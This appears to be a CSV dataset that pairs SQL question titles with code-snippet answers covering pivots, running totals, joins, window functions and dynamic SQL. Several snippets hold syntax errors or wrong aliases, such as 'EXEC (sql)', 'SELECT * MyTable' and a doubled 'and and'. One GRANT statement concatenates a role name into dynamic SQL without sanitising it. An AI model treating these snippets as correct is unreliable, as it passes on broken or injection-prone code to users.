,Unnamed: 0,NL,Code
39262,9959,sql query to select records in a specific format (using pivot or other),"DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX)

select @cols = STUFF((SELECT distinct ',' + QUOTENAME(Animal2) 
                    from animals
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

set @query = 'SELECT Animal1, ' + @cols + ' from 
             (
                select animal1, animal2, Corelation
                from animals
            ) x
            pivot 
            (
                min(Corelation)
                for animal2 in (' + @cols + ')
            ) p '

execute(@query)
"
35921,68553,SQL grouping and running total of open items for a date range,"SELECT COUNT(CASE WHEN d.CheckDate = i.StartDate THEN 1 ELSE NULL END)
         AS ItemsOpened
     , COUNT(i.StartDate)
         AS ItemsOpenedCumulative
FROM Dates AS d
  LEFT JOIN Items AS i
    ON d.CheckDate BETWEEN i.StartDate AND i.EndDate
GROUP BY d.CheckDate
"
27301,56364,Importing data from CSV file in MySQL,"LOAD DATA LOCAL INFILE 'H:/countries.csv' INTO TABLE ListOfCountries
    FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '""'
    LINES TERMINATED BY '\n'
    IGNORE 1 LINES (CountryName, CountryCode);
"
31308,32769,MySQL schema for one table,"// saving a settings value

$max_length = 20;
mysql_query(""UPDATE settings SET value = '{$max_length}' WHERE field = 'max_length'"");

// obtaining a settings value

$result = mysql_query(""SELECT value FROM settings WHERE field = 'max_length'"");
$settings = mysql_fetch_assoc($result);
$max_length = (int) $settings['value'];
"
11360,12481,Counting multiple value occurrences,"select (case when name1 = 'JOE' then name2 else name1 end) as name,
       sum(case when name1 = 'JOE' and winner = 2 then 1
                when name2 = 'JOE' and winner = 1 then 1
                else 0
           end) as wins,
       count(*) as games
from games g
where 'JOE' in (name1, name2)
group by (case when name1 = 'JOE' then name2 else name1 end);
"
20606,55544,SQL INNER JOIN return parent row values only on first match,"SELECT CASE WHEN RowNumber = 1 THEN Dept_id ELSE NULL END AS Dept_id,
       CASE WHEN RowNumber = 1 THEN Dept_name ELSE NULL END AS Dept_name,
        Emp_id, Emp_Name
FROM Dept d
INNER JOIN 
(SELECT ROW_NUMBER() OVER (PARTITION BY Dept_id ORDER BY Emp_Name) AS RowNumber, 
       Dept_id, Dept_name, Emp_id, Emp_Name
FROM Emp ) t on t.Dept_id = d. Dept_id
"
18559,19993,Deleting from Android SQLite Database,"Cursor cursor = db.query(DATABASE_TABLE, null, null, null, null, null, null); 

    if(cursor.moveToFirst()) {
        long rowId = cursor.getLong(cursor.getColumnIndex(KEY_ROWID)); 

        db.delete(DATABASE_TABLE, KEY_ROWID +  ""="" + rowId, null);
   }
"
12414,22157,webmatrix - sql query using DateTime.Now,"var lastweek = DateTime.Now.AddDays(-7);
"
35678,50499,Oracle trigger: conditional statement,"CREATE OR REPLACE TRIGGER trg_new_reorder_stock
  AFTER INSERT OR UPDATE ON stock_inventory
BEGIN
  FOR x IN (SELECT *
              FROM stock_inventory
             WHERE s_quantity <= 10)
  LOOP
    dbms_output.put_line( 'Reorder ' || x.p_id || ' it has only ' || x.s_quantity || ' units remaining.' );
  END LOOP;
END;
"
35848,11830,Is having an 'OR' in an INNER JOIN condition a bad idea?,"SELECT  *
FROM    maintable m
JOIN    othertable o
ON      o.parentId = m.id
UNION
SELECT  *
FROM    maintable m
JOIN    othertable o
ON      o.id = m.parentId
"
18818,25367,Postgresql search using only alphanumeric characters,"select *
from table
where translate(lower(WhatIDo), translate(lower(WhatIDo), 'abcdefghijklmnopqrstuvwxyz', ''), '') = 'stacks'
"
318,53901,Fill in all dates in certain date ranges from another using calendar table,"SELECT convert(varchar,d.Date, 105) FROM dbo.Days d
JOIN dbo.Holidays H ON d.Date BETWEEN h.DateFrom AND h.DateTo
"
10185,44494,Need a sql query for this scenario,"SELECT id FROM mytable WHERE 
CASE 
     WHEN EXISTS( SELECT 1 FROM mytable WHERE region='DL' AND country='IND'
                   AND restaurant='xyz' AND locationcode='100')
       THEN region='DL' AND country='IND' AND restaurant='xyz' AND locationcode='100'
     WHEN EXISTS( SELECT 1 FROM mytable WHERE region='DL' AND country='IND')
       THEN region='DL' AND country='IND'
     WHEN EXISTS( SELECT 1 FROM mytable WHERE region='DL' )
       THEN region = 'DL';
     END; 
"
33766,20943,Substring sql nvarchar value from start to first non-int character,"SELECT LEFT(ColumnName,PATINDEX('%[^0-9]%', ColumnName+'a')-1) FROM TABLE
"
38301,37423,SQL Server order by closest value to zero,"ROW_NUMBER () OVER (
  PARTITION BY PersonID 
  ORDER BY abs(datediff(dd, dischargedate, surveydate)) asc
) AS rn
"
12504,32138,SQL Select questions,"-- Sample data from the question.
declare @TestData table ([Date] datetime, [Nbr] int, [NewValue] char(3), [OldValue] char(3));
insert @TestData values
    ('2015-05-20 14:23:08', 123, 'abc', 'xyz'),
    ('2015-05-20 15:02:10', 123, 'xyz', 'abc'),
    ('2015-05-21 08:10:02', 123, 'xyz', 'pqr'),
    ('2015-05-21 10:10:05', 456, 'lmn', 'ijk');

with [SequencingCTE] as
(
    select *,
        -- [OrderAsc] will be 1 if and only if a record represents the FIRST change 
        -- for a given [Nbr] on a given day.
        [OrderAsc] = row_number() over (partition by convert(date, [Date]), [Nbr] order by [Date]),

        -- [OrderDesc] will be 1 if and only if a record represents the LAST change
        -- for a given [Nbr] on a given day.
        [OrderDesc] = row_number() over (partition by convert(date, [Date]), [Nbr] order by [Date] desc)
    from
        @TestData
)

-- Match the original value for each [Nbr] on each day with the final value of the
-- same [Nbr] on the same day, and get only those records where an actual change
-- has occurred.
select
    [Last].*
from
    [SequencingCTE] [First]
    inner join [SequencingCTE] [Last] on
        convert(date, [First].[Date]) = convert(date, [Last].[Date]) and
        [First].[Nbr] = [Last].[Nbr] and
        [First].[OrderAsc] = 1 and
        [Last].[OrderDesc] = 1
where
    [First].[OldValue] != [Last].[NewValue];
"
3608,70334,SQL to move rows up or down in two-table arrangement,"WITH x AS (
  SELECT t2.itmid, t2.ord
  FROM   dbo.test_db_002 t1
  LEFT   JOIN dbo.test_db_003 t2 ON (t1.id = t2.itmid)
  WHERE  t1.name = 'John'  -- must be unique, or query by id ...
  )
  , y AS (
  SELECT TOP 1
         t.itmid, t.ord
  FROM   dbo.test_db_003 t, x
  WHERE  t.ord < x.ord     -- smaller ord = ""above""
  ORDER  BY t.ord DESC
  )
UPDATE dbo.test_db_003 SET ord = z.ord
FROM (
   SELECT x.itmid, y.ord FROM x,y
   UNION ALL
   SELECT y.itmid, x.ord FROM x,y
   ) z
WHERE  dbo.test_db_003.itmid = z.itmid   
"
10673,58468,format specific values FOR XML PATH,"SELECT 
  Name,
  CASE WHEN Name='n2' THEN ROUND(Value,7) ELSE Value END AS Value
... 
"
22855,6886,Why SQLite index is not speed up query?,"INSERT INTO KeysTable (KeyText, Id)
  SELECT KeyText
       , KeysTable.ID  
  FROM KeysTable
    INNER JOIN StatTable 
      ON KeysTable.ID = StatTable.Key_ID
  WHERE StatTable.StatCommandCode = 4 
"
34727,6027,Retrieve previous row to subtract from current row by date,"select NAV_date, NAV_value, (NAV_value / prev_value) - 1
from (select t.*,
             (select top 1 NAV_value
              from YOURTABLENAMEGOESHERE as t2
              where t2.NAV_date < t.NAV_date
              order by t2.NAV_date desc
             ) as prev_value
      from YOURTABLENAMEGOESHERE as t
     ) as t
"
37633,34417,Pull the next row of a sort based on a previous value,"with dep_tree  (groupno, depend, group_order) as (
   select groupno, depend, 1 as group_order
   from group_list
   where depend = 0

   union all 

   select c.groupno, c.depend, p.group_order + 1
   from group_list c, 
        dep_tree p 
   where p.groupno = c.depend
)
select group_order, groupno, depend
from dep_tree
order by group_order;
"
37041,73741,Working of MySQL Query,"SELECT * MyTable 
where Column1 not in (5, 8, 12)
and Column2 <> 300 
and Column3 = 200;
"
28728,46963,Difference between values in consecutive rows for unique ID's,";with cte AS (SELECT *,ROW_NUMBER() OVER(PARTITION BY AccountNumber ORDER BY ValueDate) AS RN 
              FROM YourTable)
SELECT a.*,a.Amount - b.Amount AS Diff
FROM cte a
LEFT JOIN cte b
  ON a.AccountNumber = b.AccountNumber
  AND a.RN = b.RN -1
"
30348,49464,Converting row values into ColumnName,"SELECT [id],[b_id],[Date],
       [t_id],[p_id],[comments]
FROM   (SELECT Row_number()OVER(partition BY name ORDER BY [values]) rn,*
        FROM   SampleTbl) A
       PIVOT (Min ([Values])
             FOR Name IN ([id],[b_id],[Date],
                          [t_id],[p_id],[comments])) piv 
"
35976,9627,Getting only one row in outer join using oracle,"WITH
  x AS( SELECT 1 id FROM dual UNION SELECT 2 FROM dual UNION SELECT 3 FROM dual ),
  y AS( SELECT 1 id, 1 nr, 'B' code FROM dual
        UNION SELECT 1, 2, 'A'  FROM dual
        UNION SELECT 2, 2, 'A' FROM dual
) -- end of test data
SELECT  *
FROM    (
        SELECT  x.id, y.nr, y.code, ROW_NUMBER() OVER (PARTITION BY x.id ORDER BY y.nr) AS rn
        FROM    x
        LEFT OUTER JOIN y
        ON   y.id = x.id
)
WHERE rn = 1
"
21378,33508,SQL query - unique values with multiple condition," SELECT COUNT(DISTINCT Test_Result) as 'Total' 
    ,COUNT(DISTINCT CASE WHEN Test_Result='Pass' THEN serial_no  END) AS 'Passed'
    ,COUNT(DISTINCT CASE WHEN Test_Result='Fail' THEN serial_no  END) AS 'Failed'
 FROM [Optima_Test_Results].[dbo].[Optima PreChamber Test]
 WHERE 
DATEADD(dd, 0, DATEDIFF(dd, 0, Created_Date)) = DATEADD(dd, 0, DATEDIFF(dd, 0, GETDATE()))
"
17513,62314,I have to write a very interesting query which calculates null values and rows with values,"SELECT
  COUNT(Col1)+COUNT(Col2)+COUNT(Col3)+
  COUNT(Col4)+COUNT(Col5)+COUNT(Col6) AS ValuesCount,

  6*COUNT(*)-COUNT(Col1)-COUNT(Col2)-COUNT(Col3)-
  COUNT(Col4)-COUNT(Col5)-COUNT(Col6) AS NullCount
FROM data
GROUP BY id
"
18022,34854,Select the amount of billable hours and non-billable hours,"Select e.Name, Sum( i.Hours) as TotalHours,
       sum(case when i.ToBeBilled = 1 then i.Hours else 0 end) as Billable,
       sum(case when i.ToBeBilled = 0 then i.Hours else 0 end) as NonBillable
From Employee e Inner Join
     TimeSheet ts
     On ts.Employee_Id =  e.Id Inner Join
     Imputation i
     on i.TimeSheetID = ts.TimeSheetId
Group By e.Name, e.id
Order By Employee.Name;
"
37234,35255,TNSNames.ora entries,"NAMES.DEFAULT_DOMAIN = world
"
4688,19065,MySQL select * from last 5 days from a datetime field,"Select 
* 
from 
'myTable' 
where 'datetime' >=
      (
           select  
          `datetime` 
          from myTable 
          group by DATE(`datetime`) 
          order by `datetime` desc 4,1
        )
"
19503,1272,Convert time stored as number to string,"SELECT TO_DATE(TO_CHAR(1600,'0000'),'HH24MI') FROM DUAL;
"
24435,23922,Query Process Order,"select
  case when exists
  (
    select *
    from events as this_step
    where exists
    (
      select *
      from events as earlier_step
      where cast(earlier_step.dates as datetime) + cast(earlier_step.logtime as datetime) <
            cast(this_step.dates as datetime) + cast(this_step.logtime as datetime)
      and earlier_step.step > this_step.step
    )
  ) then 
    'ERROR'
  else
    'OKAY'
  end as status;
"
29286,41834,"Two SELECT statements in one stored procedure, one supplying input for another and the other returning more than one row","WITH first AS 
(
  SELECT val1, val2, val3, val4
    FROM Table1
   WHERE 1 = 1
), second AS
(
  SELECT val1,
         MIN(CASE WHEN rnum = 1 THEN val5 END) val51,
         MIN(CASE WHEN rnum = 1 THEN val6 END) val61,
         MIN(CASE WHEN rnum = 2 THEN val5 END) val52,
         MIN(CASE WHEN rnum = 2 THEN val6 END) val62,
         MIN(CASE WHEN rnum = 3 THEN val5 END) val53,
         MIN(CASE WHEN rnum = 3 THEN val6 END) val63
    FROM
  (
    SELECT t2.val1, val5, val6, 
           ROW_NUMBER() OVER (PARTITION BY t2.val1 ORDER BY (SELECT 1)) rnum
      FROM Table2 t2 JOIN first f
        ON t2.val1 = f.val1
  ) a
   GROUP BY val1
)
SELECT * 
  FROM first f JOIN second s
    ON f.val1 = s.val1
"
36042,32767,T-SQL statement won't accept a variable as role name in a grant statement,"declare @sql nvarchar(max)
set @sql = 'Grant select on dbo.someTable to ' + @RoleName  -- protect if required
EXEC (sql)
"
587,11267,What character set is this?,"unix shell prompt> echo Alain LefÃƒÆ’Ã‚Â¨vre | 
iconv -f utf-8 -t cp1252 | 
iconv -f utf-8 -t cp1252 | 
iconv -f utf-8 -t cp1252

Alain Lefèvre

unix shell prompt>
"
13409,70303,IN operator with Inner query SQL,"SELECT p.*
FROM `posts` p
WHERE exists (select 1
              from `users` u
              where u.user_id = ? and find_in_set(p.language, u.possible_languages)
             )
"
3113,38596,SQL Query to comparing the minutes in SQL 2008 R2 server,"select *From Table where DATEPART(hh,yourdatefield)>=17 and and convert(date,yourdatefield,103)='2014-04-03'
"
26720,70295,How to get list of all materialized views in oracle,"SELECT *
FROM  all_snapshots;
"
33195,58264,"""Tag"" searching/exclusion query design issue","select p.*
from post p
left outer join (
    select pt.post_id    
    from post_tag pt
    inner join tag t on pt.tag_id = t.id
    where t.title in ('UVW', 'XYZ')
) notag on p.id = notag.post_id 
inner join (
    select pt.post_id    
    from post_tag pt
    inner join tag t on pt.tag_id = t.id
    where t.title in ('ABC', 'DEF')
    group by pt.post_id
    having count(distinct t.title) = 2
) yestag on p.id = yestag.post_id 
where notag.post_id is null
--add additional WHERE filters here as needed
"
5522,68734,Is there any modified query for this query:,"$sub = Studentacademicinfo::whereClass($cat)->whereSection($section)->get();
"
18354,23786,How do I get the value associated with a MIN or MAX,";WITH CTE_Transactions AS (
    SELECT DISTINCT
        patient_id, 
        clinic, 
        SUM(amount) OVER (PARTITION BY patient_id, clinic) AS production,
        FIRST_VALUE(tran_date) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS first_visit,
        FIRST_VALUE(provider_id) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS first_provider_id,
        LAST_VALUE(tran_date) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS last_visit,
        LAST_VALUE(provider_id) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS last_provider_id,
        ROW_NUMBER() OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS row_num
FROM Transactions
WHERE impacts='P'
)
SELECT
    w.patient_id, 
    w.clinic, 
    p.city, 
    p.state, 
    p.zipcode, 
    p.sex, 
    w.production,
    w.first_visit, 
    w.last_visit
FROM
    CTE_Transactions W
LEFT JOIN Patient P ON
    W.patient_id = P.patient_id AND
    W.clinic = P.clinic
INNER JOIN Provider FIRST_PROV ON
    FIRST_PROV.provider_id = W.first_provider_id
INNER JOIN Provider LAST_PROV ON
    LAST_PROV.provider_id = W.last_provider_id
WHERE
    W.row_num = 1
"
35211,61936,Help with SQL Query,"select  *
from    Table2 t2
left join
        Table1 t1
on      t1.id = t2.id
where   t1.id is not null
        or (isActive = 1 and status is not null)
"
31352,72366,Database design for comments and replies,"select c.comment, r.comment as reply
from comment as c, comment as r, replyto as rt
where c.ID = rt.CommentID
and r.ID = rt.ReplyID
"
21866,49837,How to SELECT and Count range of rows in a Table,"select sum(`project-bug` between 0 and 500) as 0_500,
       sum(`project-bug` between 501 and 1000) as 501_1000,
       sum(`project-bug` between 1001 and 1500) as 1001_1500,
       sum(`project-bug` between 1501 and 2000) as 1501_2000
from projects
"
1646,54188,Mysql join order by,"SELECT u.*
FROM user_prefs u
   JOIN categories cat ON u.category_id = cat.category_id
WHERE p.user_id = 10 /* Put user id here*/
ORDER BY cat.name
"
24182,30948,How to write a SQL query that will Count two types of values in the Same Column of one Table?,"select User,    
      Count(case when item = 'A' then 1 end) as `Count of A`,
      Count(case when item = 'B' then 1 end) as `Count of B`
From yourtable
Group by User
"
25,502,Sqlite select max query and sorting,"select * 
from table
where product_price = (SELECT max(product_price) FROM table)
order by id desc
limit 1
"
